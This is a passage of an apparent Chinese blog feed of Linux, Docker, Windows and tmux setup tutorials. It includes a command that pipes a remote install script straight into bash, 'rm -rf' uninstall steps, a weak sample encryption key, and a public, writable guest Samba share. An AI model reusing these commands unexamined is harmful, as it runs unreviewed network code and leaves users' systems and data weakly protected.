<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum autoremove</span><br><span class="line"></span><br><span class="line">sudo yum clean all</span><br><span class="line"></span><br><span class="line">sudo journalctl --rotate</span><br><span class="line"></span><br><span class="line">sudo journalctl --vacuum-time=1s</span><br><span class="line"></span><br><span class="line">sudo journalctl --vacuum-size=50M</span><br><span class="line"></span><br><span class="line">sudo yum remove $(rpm -qa kernel | grep -v $(<span class="built_in">uname</span> -r))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>查看CentOS版本</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/centos-release</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>docker搭建duplicati备份本地硬盘和远程服务器数据</title>
    <url>/posts/95c5fd9c/</url>
    <content><![CDATA[<p>官网地址：<a href="https://github.com/duplicati/duplicati">duplicati&#x2F;duplicati: Store securely encrypted backups in the cloud!</a></p>
<p>github项目地址：<a href="https://github.com/duplicati/duplicati">https://github.com/duplicati/duplicati</a></p>
<p>docker hub地址：<a href="https://hub.docker.com/r/linuxserver/duplicati">hub.docker.com&#x2F;r&#x2F;linuxserver&#x2F;duplicati</a></p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i <span class="comment"># 切换到root用户</span></span><br><span class="line"></span><br><span class="line">apt update -y  <span class="comment"># 升级packages</span></span><br><span class="line"></span><br><span class="line">apt install wget curl sudo vim git  <span class="comment"># Debian系统比较干净，安装常用的软件</span></span><br></pre></td></tr></table></figure>

<h1 id="安装-Docker-环境"><a href="#安装-Docker-环境" class="headerlink" title="安装 Docker 环境"></a>安装 Docker 环境</h1><p>安装 Docker（非大陆服务器）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- get.docker.com | bash</span><br><span class="line"></span><br><span class="line">docker -v  <span class="comment">#查看 docker 版本</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> docker  <span class="comment"># 设置开机自动启动</span></span><br></pre></td></tr></table></figure>

<h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#https://github.com/docker/compose/releases 要安装其他版本的 Compose，请替换 v2.32.2</span></span><br><span class="line">非大陆</span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/2.32.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>


<h1 id="添加可执行权限-x"><a href="#添加可执行权限-x" class="headerlink" title="添加可执行权限:x"></a>添加可执行权限:x</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h1 id="在-usr-bin-路径下创建软连接"><a href="#在-usr-bin-路径下创建软连接" class="headerlink" title="在&#x2F;usr&#x2F;bin&#x2F;路径下创建软连接"></a>在&#x2F;usr&#x2F;bin&#x2F;路径下创建软连接</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h1 id="查看docker-compose版本"><a href="#查看docker-compose版本" class="headerlink" title="查看docker-compose版本"></a>查看docker-compose版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<h1 id="创建一下安装的目录"><a href="#创建一下安装的目录" class="headerlink" title="创建一下安装的目录"></a>创建一下安装的目录</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/data/docker_data/duplicati</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/duplicati</span><br><span class="line"></span><br><span class="line">nano docker-compose.yml</span><br></pre></td></tr></table></figure>

<h1 id="docker-compose-yml（注意注释部分）"><a href="#docker-compose-yml（注意注释部分）" class="headerlink" title="docker-compose.yml（注意注释部分）"></a>docker-compose.yml（注意注释部分）</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">services:</span><br><span class="line">  duplicati:</span><br><span class="line">    image: lscr.io/linuxserver/duplicati:latest</span><br><span class="line">    container_name: duplicati</span><br><span class="line">    environment:</span><br><span class="line">      - PUID=1000</span><br><span class="line">      - PGID=1000</span><br><span class="line">      - TZ=Etc/UTC</span><br><span class="line">      - SETTINGS_ENCRYPTION_KEY=88888888</span><br><span class="line">      - CLI_ARGS= <span class="comment">#optional</span></span><br><span class="line">      - DUPLICATI__WEBSERVICE_PASSWORD= <span class="comment">#optional</span></span><br><span class="line">    volumes:</span><br><span class="line">      - /path/to/duplicati/config:/config</span><br><span class="line">      - /path/to/backups:/backups               <span class="comment">#/path/to/backups可以改成备份盘的地址</span></span><br><span class="line">      - /path/to/source:/source                 <span class="comment">#/path/to/source可以改成源数据的地址</span></span><br><span class="line">    ports:</span><br><span class="line">      - 8200:8200                               <span class="comment">#8200是访问端口号</span></span><br><span class="line">    restart: unless-stopped</span><br></pre></td></tr></table></figure>

<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>

<p>访问web界面：http:&#x2F;&#x2F;服务器ip:8200 </p>
<h1 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#进入docker-compose所在的文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/duplicati  </span><br><span class="line"></span><br><span class="line"><span class="comment">#停止容器，此时不会删除映射到本地的数据</span></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"><span class="comment">#完全删除映射到本地的数据</span></span><br><span class="line"><span class="built_in">rm</span> -rf /root/data/docker_data/duplicati </span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：<br>1、不知道服务器IP，可以直接在命令行输入：curl ip.sb，会显示当前服务器的IP。<br>2、遇到访问不了的情况，请在宝塔面板的防火墙和服务商的后台防火墙里打开对应端口。</p>
</blockquote>
<h1 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#万事先备份，以防万一</span></span><br><span class="line"><span class="built_in">cp</span> -r /root/data/docker_data/duplicati /root/data/docker_data/duplicati.archive </span><br><span class="line"></span><br><span class="line"><span class="comment">#进入docker-compose所在的文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/duplicati  </span><br><span class="line"></span><br><span class="line"><span class="comment">#拉取最新的镜像</span></span><br><span class="line">docker-compose pull    </span><br><span class="line"></span><br><span class="line"><span class="comment">#重新更新当前镜像</span></span><br><span class="line">docker-compose up -d   </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>openwrt安装docker和docker-compose</title>
    <url>/posts/9c1c301c/</url>
    <content><![CDATA[<p>更新软件包索引</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">opkg update</span><br></pre></td></tr></table></figure>

<p>安装必要的软件包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">opkg install ca-certificates curl gnupg software-properties software-properties-common tar</span><br></pre></td></tr></table></figure>

<p>下载Docker安装脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br></pre></td></tr></table></figure>

<p>运行安装脚本以安装Docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh get-docker.sh</span><br></pre></td></tr></table></figure>

<p>启动Docker服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/dockerd start</span><br></pre></td></tr></table></figure>

<p>验证安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker -v</span><br></pre></td></tr></table></figure>

<p>开机自启Docker服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/dockerd <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>

<p>（可选）移除安装脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm get-docker.sh</span><br></pre></td></tr></table></figure>

<p>安装docker compose</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">opkg install docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证安装</span></span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
        <category>os</category>
        <category>openwrt</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>os</tag>
        <tag>openwrt</tag>
      </tags>
  </entry>
  <entry>
    <title>windows设置网络是否IPv6访问优先</title>
    <url>/posts/12b4b795/</url>
    <content><![CDATA[<p><strong>查询你的网络是否IPv6访问优先：</strong><a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a></p>
<p>在Windows操作系统中，你可以通过以下步骤设置IPv4优先于IPv6进行访问：</p>
<p><strong>打开命令提示符</strong>：</p>
<p>点击“开始”菜单，搜索“cmd”或“命令提示符”，右键选择“以管理员身份运行”。</p>
<p><strong>查看当前优先级设置</strong>：</p>
<p>在命令提示符中输入以下命令并按回车：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh interface ipv6 show prefixpolicies</span><br></pre></td></tr></table></figure>

<p>这将显示当前的前缀策略列表，包括每个策略的优先级、标签和前缀。</p>
<p><strong>修改优先级设置</strong>：</p>
<p>IPv4的优先级设置为高于IPv6</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh interface ipv6 <span class="built_in">set</span> prefixpolicy ::ffff:0:0/96 100 4</span><br></pre></td></tr></table></figure>

<p>这条命令将IPv4的优先级设置为100，标签为4。</p>
<p>IPv6的优先级设置为高于IPv4</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh interface ipv6 <span class="built_in">set</span> prefixpolicy ::/0 40 1</span><br></pre></td></tr></table></figure>

<p>这条命令将IPv6的优先级设置为40，标签为1。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>domain</category>
        <category>nginx</category>
        <category>lucky</category>
        <category>os,</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>nginx</tag>
        <tag>lucky</tag>
        <tag>domain</tag>
        <tag>ipv6</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu通知栏实时显示CPU,内存,网速</title>
    <url>/posts/c524a054/</url>
    <content><![CDATA[<h1 id="一、添加indicator-sysmonitor的下载源"><a href="#一、添加indicator-sysmonitor的下载源" class="headerlink" title="一、添加indicator-sysmonitor的下载源"></a>一、添加indicator-sysmonitor的下载源</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor -y</span><br></pre></td></tr></table></figure>

<h1 id="二、更新apt-get"><a href="#二、更新apt-get" class="headerlink" title="二、更新apt-get"></a>二、更新apt-get</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<p>或者： </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor &amp;&amp; sudo apt update</span><br></pre></td></tr></table></figure>

<p><img src="/img/indicator-sysmonito/1.webp" alt="24.png"></p>
<h1 id="三、安装indicator-sysmonito"><a href="#三、安装indicator-sysmonito" class="headerlink" title="三、安装indicator-sysmonito"></a>三、安装indicator-sysmonito</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install indicator-sysmonitor</span><br></pre></td></tr></table></figure>

<p><img src="/img/indicator-sysmonito/2.webp" alt="25.png"></p>
<h1 id="四、启动"><a href="#四、启动" class="headerlink" title="四、启动"></a>四、启动</h1><p><img src="/img/indicator-sysmonito/3.webp" alt="微信图片_20220627170404.png"></p>
<p>这时候通知栏默认会显示cpu和<a href="https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020">内存</a>的实时数据<img src="/img/indicator-sysmonito/4.webp" alt="26.png"></p>
<p>配置：点一下通知栏内容，按如下提示操作</p>
<p><img src="/img/indicator-sysmonito/5.webp" alt="28.png"></p>
<p>开启开机自启动</p>
<p><img src="/img/indicator-sysmonito/6.webp" alt="29.png"></p>
<p>显示格式：<code>CPU : &#123;cpu&#125; 网速 : &#123;net&#125;</code></p>
<p><img src="/img/indicator-sysmonito/7.webp" alt="00.jpg"></p>
<p>其他配置可以自由发挥~</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">网速 : &#123;net&#125;  CPU &#123;cpu&#125;  &#123;cputemp&#125;   |  MEM &#123;mem&#125;  |  SWAP &#123;swap&#125;  |  Net Speed Compact &#123;netcomp&#125;  |  Total Net Speed &#123;totalnet&#125;</span><br><span class="line"></span><br><span class="line">网速 : &#123;net&#125;  | CPU : &#123;cpu&#125;  &#123;cputemp&#125;   |  MEM &#123;mem&#125;  |  SWAP &#123;swap&#125;  |  N SC &#123;netcomp&#125;  |  TNS &#123;totalnet&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>linux</tag>
        <tag>sysmonitor</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu开启smb文件共享</title>
    <url>/posts/cf9d4390/</url>
    <content><![CDATA[<p>执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装smb</span></span><br><span class="line">sudo apt install samba</span><br><span class="line"><span class="comment">#进入编辑smb配置文件</span></span><br><span class="line">sudo vim /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>

<p>最下面粘贴这些内容（注意需要修改的地方）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ubuntu_smb]</span><br><span class="line">path = 共享地址</span><br><span class="line">available = <span class="built_in">yes</span> </span><br><span class="line">browseable = <span class="built_in">yes</span> </span><br><span class="line">public = <span class="built_in">yes</span> </span><br><span class="line">writable = <span class="built_in">yes</span> </span><br><span class="line">create mask = 0755</span><br><span class="line">security = share</span><br><span class="line">force user = 用户名</span><br><span class="line">force group = 用户名</span><br></pre></td></tr></table></figure>

<p>点击ESC，然后输入 <strong>:wq!</strong> 保存文件<br>重启smb服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service smbd restart</span><br></pre></td></tr></table></figure>

<p>如果windows访问出现<code>你不能访问此共享文件夹，因为你组织的安全策略阻止未经身份验证的来宾访问。这些策略可帮助保护你的电脑免受网络上不安全设备或恶意设备的威胁。</code></p>
<p>用这个方法解决：<a href="https://macin.top/posts/756d7e3f/?highlight=%E8%AE%BF%E9%97%AE">组织的安全策略阻止未经身份验证的来宾访问共享文件夹解决方法 | 赛博空间</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux tmux 使用教程</title>
    <url>/posts/11712b59/</url>
    <content><![CDATA[<p>如果你有断开 ssh 仍保持程序运行的需求，大概率听说过 screen 这个命令。但作为一个 37 岁的老程序，它确实有点老了，本篇文章的内容便是它的现代替代 —— tmux 的基础使用教程。</p>
<p>当然，因为我自己主要使用 Windows 开发，只是有时需要在 Linux 服务器上进行运维 &#x2F; 运行代码。因此这篇文章的深度和广度相比网上大神的长篇大论肯定是差很多的，但是如果你和我的需求差不多，我觉得这个程度的学习已经很够用了。</p>
<h1 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1 基础概念"></a>1 基础概念</h1><p>tmux 对窗口的管理是分层的，从上到下可以分为：Server, Session, Window, Pane.</p>
<ul>
<li>Server (服务器): 就是运行 tmux 的服务器，一个服务器可以运行多个会话.</li>
<li>Session (会话): 一个会话将会占满一整个终端屏幕，一个会话可以打开多个窗口.</li>
<li>Window (窗口): 一个窗口将会完整显示在会话屏幕上，但一个窗口可以分为多个窗格.</li>
<li>Pane (窗格): 每个窗格都是一个可以交互的终端，可以独立运行程序。</li>
</ul>
<p>上述层级结构用图来表示如下所示：</p>
<p><img src="/img/tmux/1.webp" alt="https://assets.zouht.com/img/blog/3846-01.webp"></p>
<p>接下来我们会逐层来讲解它们的用法。</p>
<h1 id="2-Session-会话"><a href="#2-Session-会话" class="headerlink" title="2 Session 会话"></a>2 Session 会话</h1><p>Session 是独立存在，互不影响的。一个 Session 启动后，里面运行的程序不会随用户断开 ssh 而关闭，只会因为 Session 关闭而关闭。</p>
<p>同时，一个 Session 创建后，环境变量、当前目录等状态是独立的，一个 Session 就好似一个真实的 ssh 连接，拥有完整且独立的环境。</p>
<h2 id="2-1-新建-Session"><a href="#2-1-新建-Session" class="headerlink" title="2.1 新建 Session"></a>2.1 新建 Session</h2><p>要使用 tmux，第一件事就是创建一个新的 Session，新建方式如下：</p>
<ul>
<li><code>tmux</code>：创建一个默认名称的 Session，名称会依次命名为 0, 1, 2, …</li>
<li><code>tmux new</code>：同上</li>
<li><code>tmux new -s [名称]</code>：创建一个自定义名称的 Session.</li>
</ul>
<p>例如用 <code>tmux new -s demo-session</code> 创建一个新 Session，效果如下：</p>
<p><img src="/img/tmux/2.webp" alt="https://assets.zouht.com/img/blog/3846-02.webp"></p>
<p>可以看到，Session 视图下方会显示一条状态条，就像浏览器的标签页一样。状态条从左到右是：Session 名称，打开的 Window 列表（相当于标签页），服务器名，时间。而状态条上面便是终端界面了。</p>
<h2 id="2-2-脱离-Session"><a href="#2-2-脱离-Session" class="headerlink" title="2.2 脱离 Session"></a>2.2 脱离 Session</h2><p>如果要脱离 (Detach) 一个启动的 Session，需要使用快捷键：Ctrl + B, D</p>
<p>需要强调的是，Ctrl + B 叫做 prefix，用于表明这个命令是输给 tmux 的，因此所有 tmux 快捷键都是以 prefix 开头的。<strong>按完 prefix 请松手</strong>，再按后续的具体命令。<strong>按完 prefix 请松手</strong>，再按后续的具体命令。</p>
<p>脱离后可以看到返回一条信息，提示已经从 demo 中脱离了出来。</p>
<p><img src="/img/tmux/3.webp" alt="https://assets.zouht.com/img/blog/3846-03.webp"></p>
<h2 id="2-3-显示-Session-列表"><a href="#2-3-显示-Session-列表" class="headerlink" title="2.3 显示 Session 列表"></a>2.3 显示 Session 列表</h2><p>如果要列出当前已启动的 Session，可以使用命令：<code>tmux list-sessions</code></p>
<p>可以看到我启动了三个 Session，分别命名为 demo, demo2, demo3.</p>
<p><img src="/img/tmux/4.webp" alt="https://assets.zouht.com/img/blog/3846-04.webp"></p>
<h2 id="2-4-连接已创建的-Session"><a href="#2-4-连接已创建的-Session" class="headerlink" title="2.4 连接已创建的 Session"></a>2.4 连接已创建的 Session</h2><p>如果要连接 (Attach) 一个已经创建的 Session，命令如下：</p>
<ul>
<li><code>tmux attach</code>：默认连接最近使用的 Session.</li>
<li><code>tmux attach -t [名称]</code>：连接指定名称的 Session.</li>
</ul>
<p>另外，tmux 实际上是可以多个用户连接同一个 Session 的。如果连接到相同 Session，每个人看到的内容都是完全同步的，这对于演示操作来说还是挺好的。</p>
<h2 id="2-5-关闭已创建的-Session"><a href="#2-5-关闭已创建的-Session" class="headerlink" title="2.5 关闭已创建的 Session"></a>2.5 关闭已创建的 Session</h2><p>如果要关闭已经创建的 Session，有几种方式：</p>
<ul>
<li>如果连接着一个 Session，想关闭当前这个 Session：<code>exit</code></li>
<li>如果连接着一个 Session，想关闭<strong>除了当前的</strong>其他<strong>所有</strong> Session：<code>tmux kill-session -a</code></li>
<li>关闭指定名称的 Session：<code>tmux kill-session -t [名称]</code></li>
<li><strong>强制</strong>关闭所有 Session（不推荐）：<code>tmux kill-server</code></li>
</ul>
<h1 id="3-Window-窗口"><a href="#3-Window-窗口" class="headerlink" title="3 Window 窗口"></a>3 Window 窗口</h1><p>一个 Session 中可以打开多个 Window，Window 会继承它所在 Session 的环境变量，同时 Window 之间也是独立存在，互不影响的。Window 会因为对应 Session 的关闭而关闭。</p>
<p>用浏览器来类比，一个 Session 是一个浏览器窗口，而一个 Window 是当前浏览器窗口的一个标签页。如下图所示：</p>
<p><img src="/img/tmux/5.webp" alt="https://assets.zouht.com/img/blog/3846-05.webp"></p>
<p>Window 是在 Session 中启动的，因此下文所有 Window 操作必须在某个 Session 内。</p>
<h2 id="3-1-新建和关闭-Window"><a href="#3-1-新建和关闭-Window" class="headerlink" title="3.1 新建和关闭 Window"></a>3.1 新建和关闭 Window</h2><p>如果要新建 (create) Window，可以使用快捷键：Ctrl + B, C</p>
<p>创建新 Window 后，注意下面的 tmux 状态栏，可以发现列表中已经多了一个 Window。列表中的数字代表 Window 编号，冒号后显示的是对应 Window 中正在运行的程序名。最后如果以 <code>*</code> 结尾，则是当前使用的 Window，最后如果以 <code>-</code> 结尾，则是上一个使用的 Window。</p>
<p><img src="/img/tmux/6.webp" alt="https://assets.zouht.com/img/blog/3846-06.webp"></p>
<p>如果要关闭，可以使用 Ctrl + B, Ctrl + &amp; （带确认，输入 y 回车）</p>
<p>需要提醒的是，操作指令是 &amp;，而不是 7，因此记得按 <code>SHIFT</code> 键，同时把输入法关了。</p>
<h2 id="3-2-切换-Window"><a href="#3-2-切换-Window" class="headerlink" title="3.2 切换 Window"></a>3.2 切换 Window</h2><p>如果要切换 Window，使用快捷键是很方便的：</p>
<ul>
<li>Ctrl + B, P：切换到前 (previous) 一个 Window.</li>
<li>Ctrl + B, N：切换到后 (next) 一个 Window.</li>
<li>Ctrl + B, [数字]：切换到对应序号的 Window.</li>
<li>Ctrl + B, W：使用列表切换，上下键选择，回车确认。如果你开了超多 Window 则很实用。</li>
</ul>
<p><img src="/img/tmux/7.webp" alt="https://assets.zouht.com/img/blog/3846-07.webp"></p>
<h1 id="4-Pane-窗格"><a href="#4-Pane-窗格" class="headerlink" title="4 Pane 窗格"></a>4 Pane 窗格</h1><p>一个 Window 可以切分为多个 Pane，这是我觉得 tmux 非常实用的一点。例如如果你想在运行代码的同时监控服务器状态，便可以直接左右分屏：</p>
<p><img src="/img/tmux/8.webp" alt="https://assets.zouht.com/img/blog/3846-08.webp"></p>
<p>Pane 是在 Window 中启动的，因此下文所有 Pane 操作必须在某个 Window 内。</p>
<h2 id="4-1-切分和关闭-Pane"><a href="#4-1-切分和关闭-Pane" class="headerlink" title="4.1 切分和关闭 Pane"></a>4.1 切分和关闭 Pane</h2><p>如果要将当前的 Pane 进行切分，可以用快捷键：</p>
<ul>
<li>Ctrl + B, %：竖直切分</li>
<li>Ctrl + B, “：水平切分</li>
</ul>
<p>需要提醒的是，操作指令是 % 和 “，而不是 4 和 ,，因此记得按 <code>SHIFT</code> 键，同时把输入法关了。</p>
<p>另外大家可能会觉得这个快捷键设计得莫名其妙，但是大家低头看下键盘，% 是不是刚好在键盘横向中点，” 是不是正好是纵向中点，这样想必好记多了吧。</p>
<p>如果要关闭，可以使用 Ctrl + B, Ctrl + X （带确认，输入 y 回车）</p>
<h2 id="4-2-切换-Pane"><a href="#4-2-切换-Pane" class="headerlink" title="4.2 切换 Pane"></a>4.2 切换 Pane</h2><p>如果要切换当前的 Pane，可以用：Ctrl + B, 方向键 来导航。</p>
<p>另外，激活的 Pane 的识别方式是观察边框，绿色边框围起来的就是当前激活的 Pane.</p>
<p><img src="/img/tmux/9.webp" alt="https://assets.zouht.com/img/blog/3846-09.webp"></p>
<h2 id="4-3-调整-Pane-大小"><a href="#4-3-调整-Pane-大小" class="headerlink" title="4.3 调整 Pane 大小"></a>4.3 调整 Pane 大小</h2><p>如果要调整当前激活的窗格的大小，可以使用快捷键：</p>
<ul>
<li>1 个单位微调：Ctrl + B, Ctrl + 方向键</li>
<li>5 个单位调整：Ctrl + B, Alt + 方向键</li>
</ul>
<h1 id="5-杂项"><a href="#5-杂项" class="headerlink" title="5 杂项"></a>5 杂项</h1><h2 id="5-1-滚动历史记录"><a href="#5-1-滚动历史记录" class="headerlink" title="5.1 滚动历史记录"></a>5.1 滚动历史记录</h2><p>进入 tmux 后，可以发现鼠标滚轮的窗口滚动失效了。如果要滚动历史记录，可以使用以下方式：</p>
<ul>
<li>Ctrl + B, <code>[</code>：进入滚动模式，这个时候就能拿滚轮滚动了，最后按 q 退出。</li>
<li>Ctrl + B, <code>PageUp</code>：进入滚动模式同时往上滚一页，这个时候就能拿滚轮滚动了，最后按 q 退出。</li>
</ul>
<h2 id="5-2-启用鼠标支持"><a href="#5-2-启用鼠标支持" class="headerlink" title="5.2 启用鼠标支持"></a>5.2 启用鼠标支持</h2><p>现代的 CLI 已不是枯燥乏味的纯命令行了，tmux 是可以支持鼠标操作的。</p>
<p>新建配置文件 <code>~/.tmux.conf</code>，在里面填写 <code>set -g mouse on</code>，即可开启鼠标支持。开启鼠标支持后 tmux 多了很多实用的特性，例如：</p>
<ul>
<li>右键菜单，按住右键可以调出</li>
<li>左键按住窗格边缘拖动来缩放大小</li>
<li>左键点击窗格，可以激活该窗格</li>
<li>左键点击窗口，可以切换到该窗口</li>
<li>直接拿滚轮滚动历史记录</li>
<li>……</li>
</ul>
<p><img src="/img/tmux/10.webp" alt="https://assets.zouht.com/img/blog/3846-10.webp"></p>
<p>不过开启鼠标操作后，可能会与一些 SSH 客户端已有的快捷操作冲突，例如 Windows Terminal 的左键框选，右键粘贴就会和 tmux 的左右键冲突。大家按自己情况决定是否启用吧。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
        <tag>tmux</tag>
      </tags>
  </entry>
  <entry>
    <title>everything电脑搜索神器配置方法</title>
    <url>/posts/2cd8e2d6/</url>
    <content><![CDATA[<p>下载地址：<a href="https://www.voidtools.com/zh-cn/downloads/">everything</a></p>
<p>Everything这款软件支持中文搜索，只要输入关键字就可以搜索出我们想要的文件或者文件夹</p>
<p>但是它并不支持拼音搜索，此次软件更新的版本<strong>最大的亮点就是支持拼音搜索</strong>。不过软件并不是一打开就支持拼音搜索，需要我们去设置。</p>
<p>我们找到“工具”—“选项”</p>
<p><img src="/img/everything/1.webp" alt="图片"></p>
<p>然后找到左边栏的“<strong>Content</strong>”，选择“<strong>Index file content</strong>”，再点三个点，最后点“<strong>Add Folder</strong>”</p>
<p><img src="/img/everything/2.webp" alt="图片"></p>
<p>这里要加入我们搜索的磁盘，我这里有三个磁盘空间，分别是C、D、E盘，我就得添加三次，大家有几个磁盘就添加几次吧。</p>
<p><img src="/img/everything/3.webp" alt="图片"></p>
<p>添加完全以后记得点【确定】按钮。</p>
<p>然后我们回到选项卡里，找到“<strong>Advanced</strong>”，然后找到“<strong>pinyin_type</strong>”，再在下面<strong>选择****Single Character或者QuanPin中的一个</strong>。</p>
<p><img src="/img/everything/4.webp" alt="图片"></p>
<p>这两个词分别是“<strong>首字母</strong>”和“<strong>全拼</strong>”的意思，也就是你搜索是首字母搜索还是全拼搜索的意思。选择后记得【应用】和【确定】</p>
<p>设置完成后还需要到软件<strong>“搜索”—“管理筛选器”</strong>中。</p>
<p><img src="/img/everything/5.webp" alt="图片"></p>
<p>然后点“新建”，名称这里填写“拼音”，搜索处填 <code>::pinyin:#param:</code> 填完后同样记得点“确定”。</p>
<p><img src="/img/everything/6.webp" alt="图片"></p>
<p>设置完成之后，我们在【搜索】处就可以看到“拼音”这一项了，选择它，我们就能实现拼音搜索。</p>
<p><img src="/img/everything/7.webp" alt="图片"></p>
<p>看看我没有使用拼音搜索时，我输入“wyy”那是啥也没搜出来。</p>
<p><img src="/img/everything/8.webp" alt="图片"></p>
<p>当我用了拼音搜索时，输入“wyy”时就能搜索出“网易云”的文件和文件夹了。</p>
<p><img src="/img/everything/9.webp" alt="图片"></p>
<p>我觉得用首字母搜索更方便，但如果有小伙伴要用全拼也是可以的，在上面选择里自行切换一下即可。</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>everything</tag>
      </tags>
  </entry>
  <entry>
    <title>开启ipv6实现外网访问家庭内网和webdav的配置方法</title>
    <url>/posts/d24fd9ba/</url>
    <content><![CDATA[<blockquote>
<p>IPV6格式<code>[X:X:X:X:X:X:X:X]:端口</code></p>
<p>电信的ipv6地址以240e开头，移动的ipv6地址以2409开头，联通的ipv6地址以2408开头</p>
